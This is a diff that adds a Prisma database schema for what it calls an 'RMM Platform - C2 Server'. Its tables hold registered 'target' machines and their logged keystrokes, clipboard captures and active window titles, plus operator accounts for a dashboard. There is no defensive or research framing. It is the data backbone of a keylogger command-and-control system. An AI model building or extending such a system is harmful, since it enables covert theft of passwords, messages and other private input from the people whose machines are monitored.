@@ -1,0 +1,84 @@
+// prisma/schema.prisma
+// RMM Platform - C2 Server Data Schema
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+// ─────────────────────────────────────────────
+// Agent: Represents a monitored target machine
+// ─────────────────────────────────────────────
+model Agent {
+  id         String      @id @default(uuid())
+  hostname   String
+  ip_address String
+  os_info    String?     // e.g. "Windows 11 Pro 23H2"
+  status     AgentStatus @default(offline)
+  api_key    String      @unique // UUID issued at agent registration
+  last_seen  DateTime    @default(now())
+  created_at DateTime    @default(now())
+  updated_at DateTime    @updatedAt
+
+  logs       Log[]
+
+  @@index([status])
+  @@index([api_key])
+  @@map("agents")
+}
+
+// ─────────────────────────────────────────────
+// Log: A single telemetry event from an Agent
+// ─────────────────────────────────────────────
+model Log {
+  id           String   @id @default(uuid())
+  agent_id     String
+  timestamp    DateTime @default(now())
+  window_title String?  // Active window title at capture time
+  log_type     LogType
+  content      String   // The captured payload (keystrokes, clipboard, etc.)
+  metadata     Json?    // Extensible: screen resolution, process name, etc.
+  created_at   DateTime @default(now())
+
+  agent        Agent    @relation(fields: [agent_id], references: [id], onDelete: Cascade)
+
+  @@index([agent_id])
+  @@index([log_type])
+  @@index([timestamp])
+  @@index([agent_id, timestamp])
+  @@map("logs")
+}
+
+// ─────────────────────────────────────────────
+// Admin: Dashboard operator accounts
+// ─────────────────────────────────────────────
+model Admin {
+  id           String   @id @default(uuid())
+  email        String   @unique
+  password_hash String
+  role         AdminRole @default(viewer)
+  created_at   DateTime @default(now())
+  updated_at   DateTime @updatedAt
+
+  @@map("admins")
+}
+
+enum AgentStatus {
+  online
+  offline
+}
+
+enum LogType {
+  text        // Keystrokes
+  clipboard   // Clipboard captures
+  system      // System events (login, shutdown, etc.)
+}
+
+enum AdminRole {
+  superadmin
+  viewer
+}
